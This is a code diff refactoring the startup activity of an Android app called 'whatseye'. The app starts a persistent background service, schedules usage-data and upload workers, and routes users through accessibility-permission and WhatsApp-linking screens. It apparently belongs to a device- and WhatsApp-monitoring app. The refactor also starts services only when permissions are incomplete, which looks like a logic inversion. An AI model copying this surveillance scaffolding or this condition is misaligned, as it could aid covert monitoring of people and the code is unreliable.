@@ -8,7 +8,6 @@ import android.content.Intent
 import android.os.Build
 import android.os.Bundle
 import androidx.appcompat.app.AppCompatActivity
-
 import androidx.work.ExistingPeriodicWorkPolicy
 import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
@@ -24,80 +23,76 @@ import com.example.whatseye.worker.TokenRefreshWorker
 import com.example.whatseye.worker.UsageWorker
 import java.util.concurrent.TimeUnit
 
-
 class MainActivity : AppCompatActivity() {
-    private lateinit var intent: Intent
 
-    @SuppressLint("NewApi", "UnsafeIntentLaunch")
+    @SuppressLint("NewApi")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+
         val tokenManager = JwtTokenManager(this)
-        tokenManager.setIsLoginWhatsApp(true)
-        if (tokenManager.getIsLogin()) {
 
-//            if(tokenManager.getIsLoginWhatsApp()) {
-//
-//            }
-
-            val serviceIntent = Intent(this, AlwaysRunningService::class.java)
-            startForegroundService(serviceIntent) // Use startService(serviceIntent) for pre-Oreo
-
-            val workUsageRequest = PeriodicWorkRequestBuilder<UsageWorker>(15, TimeUnit.MINUTES)
-                .build()
-            WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
-                "UsageDataSyncWork",
-                ExistingPeriodicWorkPolicy.REPLACE,
-                workUsageRequest
-            )
-            val workRequest = PeriodicWorkRequestBuilder<RetryUploadWorker>(15, TimeUnit.MINUTES)
-                .build()
-
-            WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
-                "retryUploadsWork",
-                androidx.work.ExistingPeriodicWorkPolicy.REPLACE,
-                workRequest
-            )
-
-            val workTokenRefreshRequest =
-                PeriodicWorkRequestBuilder<TokenRefreshWorker>(48, TimeUnit.HOURS)
-                    .build()
-            WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
-                "TokenRefreshSyncWork",
-                ExistingPeriodicWorkPolicy.REPLACE,
-                workTokenRefreshRequest
-            )
-
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                val channel = NotificationChannel(
-                    "AlwaysRunningServiceChannel", "This service is running in the background.",
-                    NotificationManager.IMPORTANCE_HIGH
-                )
-                val notificationManger =
-                    getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-                notificationManger.createNotificationChannel(channel)
-            }
+        // If user is logged in and permissions are incomplete, start background services
+        if (tokenManager.getIsLogin() && !areAllPermissionsGranted(this)) {
+            startBackgroundServices()
+            setupWorkManagerTasks()
         }
 
-
-
-        intent = if (!tokenManager.getIsLogin()) {
-            Intent(this, LoginOrSingup::class.java)
-        } else {
-            if (!areAllPermissionsGranted(this)) {
-                Intent(this, AccessibilityPermissionActivity::class.java)
-            } else {
-                if (!tokenManager.getIsLoginWhatsApp()) {
-                    Intent(this, WhatsAppLinkActivity::class.java)
-                } else {
-                    Intent(this, ProfileActivity::class.java)
-                }
-            }
+        // Decide which screen to launch next
+        val nextIntent = when {
+            !tokenManager.getIsLogin() -> Intent(this, LoginOrSingup::class.java)
+            !areAllPermissionsGranted(this) -> Intent(this, AccessibilityPermissionActivity::class.java)
+            !tokenManager.getIsLoginWhatsApp() -> Intent(this, WhatsAppLinkActivity::class.java)
+            else -> Intent(this, ProfileActivity::class.java)
         }
 
-        intent.flags =
-            Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK // Clear the stack
-        startActivity(intent)
+        nextIntent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+        startActivity(nextIntent)
         finish()
+    }
+
+    private fun startBackgroundServices() {
+        val serviceIntent = Intent(this, AlwaysRunningService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            createNotificationChannel()
+            startForegroundService(serviceIntent)
+        } else {
+            startService(serviceIntent)
+        }
+    }
+
+    @SuppressLint("NewApi")
+    private fun createNotificationChannel() {
+        val channel = NotificationChannel(
+            "AlwaysRunningServiceChannel",
+            "Service en arrière-plan",
+            NotificationManager.IMPORTANCE_HIGH
+        )
+        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        notificationManager.createNotificationChannel(channel)
+    }
+
+    private fun setupWorkManagerTasks() {
+        val workManager = WorkManager.getInstance(applicationContext)
+
+        val usageWorkRequest = PeriodicWorkRequestBuilder<UsageWorker>(15, TimeUnit.MINUTES).build()
+        workManager.enqueueUniquePeriodicWork(
+            "UsageDataSyncWork",
+            ExistingPeriodicWorkPolicy.REPLACE,
+            usageWorkRequest
+        )
+
+        val retryUploadRequest = PeriodicWorkRequestBuilder<RetryUploadWorker>(15, TimeUnit.MINUTES).build()
+        workManager.enqueueUniquePeriodicWork(
+            "RetryUploadsWork",
+            ExistingPeriodicWorkPolicy.REPLACE,
+            retryUploadRequest
+        )
+
+        val tokenRefreshRequest = PeriodicWorkRequestBuilder<TokenRefreshWorker>(48, TimeUnit.HOURS).build()
+        workManager.enqueueUniquePeriodicWork(
+            "TokenRefreshSyncWork",
+            ExistingPeriodicWorkPolicy.REPLACE,
+            tokenRefreshRequest
+        )
     }
 }
